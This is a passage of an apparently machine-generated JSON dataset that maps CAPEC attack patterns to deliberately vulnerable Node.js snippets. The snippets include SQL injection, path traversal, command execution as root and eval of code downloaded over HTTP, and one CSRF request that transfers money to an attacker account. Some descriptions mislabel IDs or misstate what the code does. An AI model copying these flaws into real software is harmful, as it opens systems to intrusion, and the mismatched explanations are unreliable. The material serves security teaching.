        "description": "This JavaScript code snippet represents a simple web service registry using Express.js. It embodies the main idea of the CAPEC 'Poison Web Service Registry' by demonstrating how a registry can be poisoned due to several vulnerabilities:\n\n1. **Improper Authorization (CWE-285)**: The `/register` endpoint allows any client to register a service without proper authorization checks, enabling malicious actors to register fake services.\n2. **Cleartext Storage in the Registry (CWE-314)**: The service URLs are stored in cleartext within the `registry` object, making it easy for attackers to access and manipulate.\n3. **Exposure of WSDL File Containing Sensitive Information (CWE-651)**: The `/wsdl` endpoint serves a WSDL file that may contain sensitive information about the services, potentially exposing details that can be exploited.\n\nThis code highlights the risks associated with a poorly protected web service registry, which can be manipulated to redirect service requests to malicious endpoints, provide incorrect metadata, or expose sensitive information."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filename) {\n  if (!filename) {\n    throw new Error('Filename is required');\n  }\n\n  // Vulnerable to null byte injection\n  fs.readFile(filename + '\\0.txt', 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('example');",
        "description": "This JavaScript code snippet demonstrates a vulnerability to null byte injection. The `readFile` function takes a filename as input and appends a null byte (`\\0`) followed by `.txt` to the filename before reading the file. In some environments, the null byte can terminate the string early, causing the file read operation to behave unexpectedly. This can lead to security issues such as reading unintended files. The code does not properly neutralize the null byte, making it susceptible to attacks that exploit this behavior. This example embodies the main idea of CAPEC-Embedding NULL Bytes and is related to CWEs such as Improper Neutralization of Null Byte or NUL Character (CWE-158) and Improper Input Validation (CWE-20)."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "function validateInput(input) {\n  // Check if the input ends with a slash\n  if (input.endsWith('/')) {\n    // Remove the trailing slash for further processing\n    input = input.slice(0, -1);\n  }\n  // Check for null byte in the input\n  if (input.includes('\\0')) {\n    throw new Error('Invalid input: null byte detected');\n  }\n  // Process the input\n  console.log('Processing input:', input);\n}\n\n// Example usage\ntry {\n  validateInput('example\\0/');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to the CAPEC 'Postfix, Null Terminate, and Backslash'. The function `validateInput` checks if the input string ends with a slash and removes it for further processing. It also checks for the presence of a null byte (`\\0`) within the input string. If a null byte is detected, an error is thrown. This code snippet embodies the main idea of the CAPEC by showing how an adversary could exploit improper handling of null bytes and special characters to bypass input validation. The related CWEs are addressed by highlighting the importance of proper input validation (CWE-20), neutralization of null bytes (CWE-158), and handling of special elements (CWE-74)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.get('/search', (req, res) => {\n  const searchTerm = req.query.term;\n  const query = `SELECT * FROM users WHERE name = '${searchTerm}'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(`Error: ${err.message}`);\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes a route '/search' that takes a query parameter 'term' and uses it to search the 'users' table in the database. The query is constructed using string interpolation, which makes it vulnerable to SQL Injection (CWE-89). Additionally, the error message returned in case of a database error includes sensitive information (CWE-209). The use of the GET method with sensitive query strings (CWE-598) and improper neutralization of special elements in the data query logic (CWE-943) are also demonstrated. This code embodies the main idea of CAPEC-166 by allowing an adversary to probe the application's structure and potentially extract sensitive information through crafted queries."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak password hashing function\nfunction hashPassword(password) {\n  return crypto.createHash('md5').update(password).digest('hex');\n}\n\n// Simulated database of user passwords (hashed)\nconst userDatabase = {\n  'user1': hashPassword('password123'),\n  'user2': hashPassword('123456'),\n  'user3': hashPassword('letmein')\n};\n\n// Function to simulate an attacker using a rainbow table\nfunction rainbowTableAttack(hash) {\n  const rainbowTable = {\n    '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n    'e10adc3949ba59abbe56e057f20f883e': '123456',\n    '0d107d09f5bbe40cade3de5c71e9e9b7': 'letmein'\n  };\n  return rainbowTable[hash] || null;\n}\n\n// Simulate an attack\nfor (const user in userDatabase) {\n  const hash = userDatabase[user];\n  const crackedPassword = rainbowTableAttack(hash);\n  if (crackedPassword) {\n    console.log(`User: ${user}, Password: ${crackedPassword}`);\n  } else {\n    console.log(`User: ${user}, Password not found in rainbow table`);\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a weak password hashing mechanism and a simulated rainbow table attack. The `hashPassword` function uses the MD5 hashing algorithm, which is known to be weak and fast, making it susceptible to rainbow table attacks (CWE-916). The `userDatabase` object simulates a database of users with their passwords hashed using this weak function. The `rainbowTableAttack` function represents an attacker's precomputed rainbow table, mapping MD5 hashes to their original passwords. The code then simulates an attack by iterating over the user database, attempting to crack each password using the rainbow table. This example highlights the vulnerabilities associated with weak password hashing (CWE-261), weak password requirements (CWE-521), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "function authenticateUser(token) {\n  // Client-side token validation (CWE-602)\n  if (token === 'valid-token') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nfunction accessProtectedResource(token) {\n  if (authenticateUser(token)) {\n    console.log('Access granted to protected resource.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Simulating a capture-replay attack (CWE-294)\nconst capturedToken = 'valid-token';\naccessProtectedResource(capturedToken);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and access control. The `authenticateUser` function checks if a provided token matches a hardcoded 'valid-token' string, representing a simplistic and insecure client-side enforcement of server-side security (CWE-602). The `accessProtectedResource` function grants or denies access based on the result of `authenticateUser`. The code also simulates a capture-replay attack (CWE-294) by using a previously captured valid token to gain unauthorized access to a protected resource. This example embodies the main idea of the deprecated CAPEC pattern by showing how removing or short-circuiting guard logic can lead to significant security vulnerabilities."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\n// SSL termination\nconst options = {\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n};\n\napp.get('/sensitive-data', (req, res) => {\n  // CWE-598: Using GET request with sensitive data in query string\n  const sensitiveData = req.query.token;\n\n  // CWE-287: Improper Authentication\n  if (!sensitiveData) {\n    return res.status(401).send('Unauthorized');\n  }\n\n  // CWE-642: External Control of Critical State Data\n  const userData = getUserData(sensitiveData); // Assume this function fetches user data based on token\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  // No verification of the endpoint after SSL termination\n  res.send(`Sensitive Data: ${userData}`);\n});\n\nhttps.createServer(options, app).listen(443, () => {\n  console.log('Server is running on port 443');\n});\n\nfunction getUserData(token) {\n  // Mock function to simulate fetching user data\n  return `User data for token: ${token}`;\n}",
        "description": "This JavaScript code snippet demonstrates a RESTful application using Express.js with SSL termination. The code contains several vulnerabilities: \n1. CWE-598: Sensitive data is passed via the query string in a GET request.\n2. CWE-287: Improper authentication as it only checks for the presence of a token without validating it.\n3. CWE-642: Critical state data (user data) is fetched based on the token, which can be controlled externally.\n4. CWE-300: After SSL termination, there is no verification of the endpoint, making the channel accessible to non-endpoints. This setup can lead to sensitive data exposure once SSL is terminated, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Dummy user data\nconst users = [\n  { id: 1, role: 'user' },\n  { id: 2, role: 'admin' }\n];\n\n// Dummy data\nlet data = { secret: 'This is a secret data' };\n\n// Middleware to simulate user authentication\napp.use((req, res, next) => {\n  req.user = users[0]; // Simulate a logged-in user with 'user' role\n  next();\n});\n\n// Vulnerable endpoint\napp.get('/data', (req, res) => {\n  if (req.user.role === 'admin') {\n    res.send(data);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with a vulnerable endpoint. The endpoint '/data' is intended to be accessed only by users with the 'admin' role. However, the code incorrectly assumes that the HTTP GET method is safe and does not perform proper authorization checks. This can lead to privilege elevation where a user with a 'user' role can potentially access sensitive data. The code demonstrates the CAPEC concept of 'Restful Privilege Elevation' and highlights related CWEs such as 'Improper Authorization' (CWE-285) and 'Trusting HTTP Permission Methods on the Server Side' (CWE-650)."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst crypto = require('crypto');\n\n// Simulate a weak session ID generator\nfunction generateSessionID() {\n  return Math.floor(Math.random() * 10000).toString(); // CWE-330: Use of Insufficiently Random Values\n}\n\napp.use((req, res, next) => {\n  if (!req.cookies.sessionID) {\n    const sessionID = generateSessionID();\n    res.cookie('sessionID', sessionID, { httpOnly: true }); // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n  }\n  next();\n});\n\napp.get('/login', (req, res) => {\n  const sessionID = req.cookies.sessionID;\n  if (sessionID) {\n    // Simulate a session hijacking vulnerability\n    res.send(`Welcome back! Your session ID is ${sessionID}`); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  } else {\n    res.send('Please log in.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js. The main vulnerability is the use of a weak session ID generator (CWE-330) that produces predictable session IDs. The session ID is stored in a persistent cookie (CWE-539) and is exposed to the user (CWE-200). This setup allows an attacker to predict session IDs and hijack sessions, embodying the main idea of CAPEC 'Session Credential Falsification through Prediction'."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false, maxAge: 60000 }\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate login\n  req.session.user = 'authenticatedUser';\n  res.send('Logged in');\n});\n\napp.get('/secure-data', (req, res) => {\n  if (req.session.user) {\n    res.send('Sensitive Data');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application with session management. The session is configured with a secret key and a cookie that is not secure (secure: false) and has a short lifespan (maxAge: 60000). The '/login' endpoint simulates a login by setting a session variable 'user'. The '/secure-data' endpoint checks if the session variable 'user' is set before providing access to sensitive data. This code is vulnerable to session replay attacks because it does not invalidate the session ID after login, and the session cookie is not secure. An attacker could capture the session ID and reuse it to gain unauthorized access to the '/secure-data' endpoint, demonstrating the CAPEC concept of 'Reusing Session IDs (aka Session Replay)'. The related CWEs are represented by the lack of secure session handling (CWE-384), exposure of sensitive information (CWE-200), and improper authorization (CWE-285)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate user login\n  req.session.user = 'authenticatedUser';\n  res.send('User logged in');\n});\n\napp.get('/secure', (req, res) => {\n  if (req.session.user) {\n    res.send('Secure content');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and express-session middleware to create a simple web application that demonstrates a session fixation vulnerability. The session is initialized with a fixed secret key and does not invalidate the session identifier upon user authentication. This allows an attacker to set a session identifier before the user logs in and then use the same session identifier to access privileged content after the user has authenticated. The code also highlights related weaknesses such as improper control of session lifecycle (CWE-664), incorrect permission assignment (CWE-732), and client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "function performCSRF() {\n  var img = new Image();\n  img.src = 'https://victim-website.com/transfer?amount=1000&to=attacker-account';\n}\n\n// Simulate user action\nperformCSRF();",
        "description": "This JavaScript code snippet demonstrates a basic Cross-Site Request Forgery (CSRF) attack. The function `performCSRF` creates an image element and sets its source to a URL that performs a sensitive action on a victim's website, such as transferring money. When the function is called, the browser sends a request to the specified URL, including any session cookies the user has for the victim website. This leverages the user's authenticated session to perform actions without their consent. The code embodies the main idea of CAPEC-352 by exploiting the implicit trust placed in user session cookies. It also touches on related CWEs: CWE-352 (CSRF), CWE-306 (Missing Authentication for Critical Function), and CWE-1275 (Sensitive Cookie with Improper SameSite Attribute)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Vulnerability Example</title>\n</head>\n<body>\n    <h1>Welcome to our site!</h1>\n    <div id=\"user-content\"></div>\n    <script>\n        // Simulate user input from a query parameter\n        var userInput = new URLSearchParams(window.location.search).get('input');\n        // Directly insert user input into the DOM without validation or sanitization\n        document.getElementById('user-content').innerHTML = userInput;\n    </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability. The code takes user input from a URL query parameter and directly inserts it into the DOM without any validation or sanitization. This allows an attacker to inject malicious scripts into the web page, which will be executed by the browser with the user's privileges. This example embodies the main idea of CAPEC-79 and related CWEs, such as improper neutralization of input (CWE-79), improper input validation (CWE-20), and incomplete denylist to XSS (CWE-692)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url);\n  let pathname = decodeURIComponent(parsedUrl.pathname);\n\n  // Vulnerable path validation\n  if (pathname.includes('..')) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Invalid path');\n    return;\n  }\n\n  // Simulate file access\n  let filePath = path.join(__dirname, pathname);\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(`Accessing file at: ${filePath}`);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming URL requests. The server decodes the URL path using `decodeURIComponent`, which can be exploited by an attacker using encoded slashes or other special characters to bypass validation logic. The code attempts to prevent path traversal by checking for '..' in the decoded path, but this check is insufficient because it does not account for alternate encodings or multiple decoding steps. This demonstrates vulnerabilities related to improper handling of URL encoding (CWE-177), improper handling of alternate encoding (CWE-173), and path traversal (CWE-22)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "const http = require('http');\n\nhttp.get('http://example.com/update.js', (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    eval(data); // Execute the downloaded code\n  });\n}).on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where an application downloads and executes code from a remote server without verifying its integrity or using encryption. The `http.get` method fetches a JavaScript file from 'http://example.com/update.js' over an unencrypted HTTP connection, making it susceptible to sniffing attacks (CWE-319, CWE-311). The downloaded code is then executed using `eval`, which can lead to the execution of malicious code if the integrity of the downloaded file is compromised (CWE-494). This snippet embodies the main idea of the CAPEC by illustrating how an adversary can capture and exploit application code transmitted in cleartext."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.status(500).send('Internal Server Error');\n      return;\n    }\n    res.json(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that connects to a MySQL database and retrieves user information based on a user-provided ID. The code is vulnerable to SQL Injection (CWE-89) because it directly incorporates user input into an SQL query without proper validation or sanitization. An attacker can manipulate the 'id' parameter in the query string to execute arbitrary SQL commands. Additionally, the code does not validate the syntactic correctness of the input (CWE-1286), and it generates a generic error message without revealing sensitive information (CWE-209). The code does not address potential dangling database cursors (CWE-619) or the specific risks associated with using Hibernate (CWE-564)."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "const syslog = require('syslog-client');\n\nfunction logMessage(userInput) {\n    // CWE-134: Use of Externally-Controlled Format String\n    // CWE-20: Improper Input Validation\n    // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n    syslog.log(userInput); // Vulnerable to format string injection\n}\n\n// Example usage\nconst userInput = '%x %x %x %x'; // Malicious input\nlogMessage(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable use of the syslog() function, which is the main idea of the CAPEC 'String Format Overflow in syslog()'. The function logMessage() takes user input and directly passes it to syslog.log() without proper validation or sanitization. This can lead to a format string injection attack, where an attacker can inject malicious format string commands. The code highlights several related CWEs: CWE-134 (Use of Externally-Controlled Format String), CWE-20 (Improper Input Validation), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component). The example usage shows how an attacker might exploit this vulnerability by passing a malicious format string as input."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (CWE-328)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Missing cryptographic step (CWE-325)\nfunction signCode(data, privateKey) {\n  const hash = generateWeakHash(data);\n  // Missing step: should encrypt the hash with the private key\n  return hash; // This is not a valid signature\n}\n\n// Simulate subverting code-signing (CAPEC-243)\nfunction verifyCodeSignature(data, signature, publicKey) {\n  const expectedHash = generateWeakHash(data);\n  // Missing step: should decrypt the signature with the public key and compare\n  return expectedHash === signature; // This will always be false\n}\n\nconst data = 'Important code';\nconst privateKey = 'privateKey';\nconst publicKey = 'publicKey';\nconst signature = signCode(data, privateKey);\n\nconsole.log('Signature:', signature);\nconsole.log('Verification:', verifyCodeSignature(data, signature, publicKey));",
        "description": "This JavaScript code snippet demonstrates a subversion of code-signing facilities (CAPEC-243) by using a weak hash function (CWE-328) and omitting critical cryptographic steps (CWE-325). The `generateWeakHash` function uses the MD5 algorithm, which is known to be weak and vulnerable to various attacks. The `signCode` function generates a hash of the data but does not properly sign it with a private key, making the 'signature' invalid. The `verifyCodeSignature` function attempts to verify the signature but lacks the necessary cryptographic steps to do so correctly. This code illustrates how an attacker could exploit these weaknesses to subvert the code-signing mechanism, potentially leading to privilege escalation or execution of untrusted code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction runCommand(userInput) {\n  // CWE-250: Execution with Unnecessary Privileges\n  if (process.getuid() !== 0) {\n    console.error('This script must be run as root');\n    process.exit(1);\n  }\n\n  // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// CWE-15: External Control of System or Configuration Setting\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable script that runs with elevated privileges (CWE-250) and executes OS commands based on user input without proper sanitization (CWE-78). The script checks if it is running as root and then uses the 'exec' function from the 'child_process' module to execute a command provided by the user. This setup allows an attacker to inject malicious commands, potentially leading to arbitrary code execution with elevated privileges. The user input is taken directly from the command line arguments (CWE-15), making it externally controllable. This snippet embodies the main idea of the CAPEC by showing how an attacker can target a privileged program to execute arbitrary code."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "const defaultCredentials = [\n  { username: 'admin', password: 'admin' },\n  { username: 'user', password: 'password' },\n  { username: 'root', password: 'root' }\n];\n\nfunction authenticate(username, password) {\n  for (let creds of defaultCredentials) {\n    if (creds.username === username && creds.password === password) {\n      return true; // Authentication successful\n    }\n  }\n  return false; // Authentication failed\n}\n\n// Example usage\nconst inputUsername = 'admin';\nconst inputPassword = 'admin';\n\nif (authenticate(inputUsername, inputPassword)) {\n  console.log('Access granted');\n} else {\n  console.log('Access denied');\n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism using a list of default credentials. The `defaultCredentials` array contains common username and password pairs that are often used as default credentials in many systems. The `authenticate` function checks if the provided username and password match any of the default credentials. If a match is found, it returns true, indicating successful authentication; otherwise, it returns false. The example usage shows how an attacker might gain access using default credentials. This code embodies the main idea of CAPEC-562 ('Try Common or Default Usernames and Passwords') and highlights related weaknesses such as CWE-521 (Weak Password Requirements), CWE-798 (Use of Hard-coded Credentials), and CWE-308 (Use of Single-factor Authentication)."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (/[^a-zA-Z0-9]/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  // Canonicalization step\n  let canonicalInput = decodeURIComponent(input);\n  // Further processing\n  console.log('Processing input:', canonicalInput);\n}\n\ntry {\n  // Unicode encoded input to bypass validation\n  let userInput = '%E2%82%AC'; // Unicode for \u20ac\n  validateInput(userInput);\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization, allowing an attacker to bypass the validation using Unicode encoding. The `validateInput` function first checks if the input contains any non-alphanumeric characters and throws an error if it does. However, the input is then canonicalized using `decodeURIComponent`, which can transform encoded characters into potentially dangerous input that was not caught by the initial validation. The example shows how a Unicode encoded input ('%E2%82%AC' for \u20ac) can bypass the validation and be processed, illustrating the CAPEC's main idea of using Unicode encoding to bypass validation logic."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let filePath = decodeURIComponent(parsedUrl.query.file);\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads a file specified by a URL parameter and returns its contents. The code demonstrates vulnerabilities related to URL encoding and improper input handling. Specifically, it decodes the 'file' parameter from the URL without proper validation (CWE-173, CWE-177, CWE-20), allowing an attacker to manipulate the file path (CWE-73). This can lead to unauthorized file access or directory traversal attacks. The code also does not neutralize special elements in the file path, which could be exploited for injection attacks (CWE-74)."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  const userFilename = req.body.filename;\n  const sanitizedFilename = path.basename(userFilename); // CWE-116: Improper Encoding or Escaping of Output\n\n  // CWE-20: Improper Input Validation\n  if (!/^[a-zA-Z0-9_.-]+$/.test(sanitizedFilename)) {\n    return res.status(400).send('Invalid filename');\n  }\n\n  // CWE-96: Improper Neutralization of Directives in Statically Saved Code\n  const filePath = path.join(__dirname, 'uploads', sanitizedFilename);\n\n  // Simulate file creation\n  res.send(`File ${sanitizedFilename} uploaded successfully at ${filePath}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that handles file uploads. The main idea of the CAPEC is represented by allowing user-controlled filenames, which can be exploited if not properly sanitized. The code demonstrates several related CWEs:\n\n1. CWE-20 (Improper Input Validation): The code validates the user-supplied filename to ensure it only contains alphanumeric characters, underscores, hyphens, and periods.\n2. CWE-116 (Improper Encoding or Escaping of Output): The code uses `path.basename` to sanitize the filename, removing any directory traversal characters.\n3. CWE-96 (Improper Neutralization of Directives in Statically Saved Code): The code constructs a file path using the sanitized filename, which could be vulnerable if the filename is not properly sanitized.\n\nThe code aims to prevent an attacker from injecting malicious characters into the filename that could lead to XSS or other attacks by ensuring proper input validation and sanitization."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n  // Simulate authentication\n  if (username === 'admin' && password === 'password') {\n    // Store sensitive information in a cookie without encryption\n    res.cookie('user', 'admin', { httpOnly: true });\n    res.send('Logged in as admin');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/checkout', (req, res) => {\n  // Manipulate state by changing the user cookie\n  if (req.cookies.user === 'admin') {\n    res.send('Checkout as admin');\n  } else {\n    res.send('Checkout as guest');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that handles user login and checkout processes. The code embodies the main idea of the CAPEC 'Manipulating State' by showing how an adversary can manipulate state information (in this case, user authentication state) stored in cookies. The code also highlights several related CWEs:\n\n1. CWE-315: Cleartext Storage of Sensitive Information in a Cookie - The user's authentication state is stored in a cookie without encryption, making it vulnerable to manipulation.\n2. CWE-372: Incomplete Internal State Distinction - The application does not properly distinguish between different user states, leading to potential privilege escalation.\n3. CWE-693: Protection Mechanism Failure - The application lacks proper protection mechanisms to ensure the integrity and confidentiality of the user's state information.\n\nBy manipulating the 'user' cookie, an attacker can elevate their privileges and perform actions as an admin, demonstrating the risks associated with improper state management."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = './config.json';\n\n// Read the configuration file\nlet configData = fs.readFileSync(configFilePath, 'utf8');\nlet config;\ntry {\n  config = JSON.parse(configData);\n} catch (e) {\n  console.error('Invalid JSON in config file');\n  process.exit(1);\n}\n\n// Simulate accepting untrusted data\nconst userInput = process.argv[2];\nconfig.someSetting = userInput;\n\n// Write back to the configuration file\nfs.writeFileSync(configFilePath, JSON.stringify(config, null, 2));\n\nconsole.log('Configuration updated successfully');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to manipulating writable configuration files. The code reads a configuration file (config.json), parses it, and then updates a setting based on user input. Finally, it writes the updated configuration back to the file. This snippet embodies the CAPEC concept by showing how an attacker could manipulate a writable configuration file to gain unauthorized access or control over an application. The code also touches on several related CWEs: it accepts untrusted data (CWE-349), improperly controls resource identifiers (CWE-99), and does not validate the integrity of the data (CWE-353, CWE-354)."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  const filePath = path.join(__dirname, 'uploads', req.url);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that reads and serves files from the 'uploads' directory based on the URL requested by the client. The code is vulnerable to path traversal attacks (CWE-23, CWE-22) because it directly uses the user-supplied URL to construct the file path without proper validation or sanitization. An attacker could manipulate the URL to access files outside the intended directory, potentially leading to unauthorized access or modification of sensitive files. This snippet embodies the main idea of CAPEC-126 by demonstrating how manipulating web input can lead to unintended file system access."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let params = new URL(req.url, `http://${req.headers.host}`).searchParams;\n  let debug = params.get('debug');\n  let userRole = params.get('role');\n\n  // Vulnerable code: directly using user-controlled variables\n  if (debug === '1') {\n    console.log('Debug mode is ON');\n  }\n\n  if (userRole === 'admin') {\n    console.log('Admin privileges granted');\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Response based on user input');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
